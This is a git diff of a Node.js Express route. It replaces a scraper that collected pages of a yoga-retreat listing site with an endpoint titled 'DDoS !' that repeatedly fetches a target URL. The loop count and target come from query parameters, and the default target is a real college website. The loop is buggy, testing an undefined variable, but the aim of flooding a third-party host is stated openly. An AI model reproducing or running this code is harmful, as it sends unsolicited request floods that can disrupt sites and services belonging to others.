@@ -173,53 +173,42 @@ app.get('/all',function(req,res){
 
 app.get('/',function(req,res){
 
-    var npages=2;
-    if(req.query.pages)
+    var loops=200;
+
+    var url="http://msit.in/"
+
+    if(req.query.loops)
     {
-        npages=req.query.pages;
+        loops=req.query.loops;
+    }
+    if(req.query.url)
+    {
+        url=req.query.url;
     }
     res.write('<head>')
 
     res.write('<title>')
-    res.write('Data Jacking !')
+    res.write('DDoS !')
 
     res.write('</title>')   
      res.write('</head>')
 
      res.write('<h1>')
-     res.write('Lets Scrape Some Data out of '+npages+' pages ! <br>')
+     res.write('Lets Mess up ! '+url+'<br>')
  
      res.write('</h1>')   
 
+    var it=0
 
+    for(it=0;i<loops;it++)
+    {
+        res.write('<br>Iteration : '+it)
+        gethtml(url)
+        
+    }
 
-     var url="https://www.bookyogaretreats.com/all/d/asia-and-oceania/india?page="
+     
 
-    var i=1;
-    var tosend=""
-    var linksToSend=[]
-    var ondone=function(links){
-        for (var ij = 0; ij < links.length; ij++) {
-            linksToSend.push(links[ij])
-        }
-
-
-        var url2=url+i
-        if(i<=npages){
-            res.write("<br>Parsing Page : "+i+" of "+npages+" --- <a href="+url2+">"+url2+"</a>");4
-            start(url2,ondone)  
-            i=i+1
-        }
-        else{
-
-            next_step(linksToSend,res)
-                        
-        }
-    };
-
-
-    start(url+i,ondone)   
-      
     
 
 })
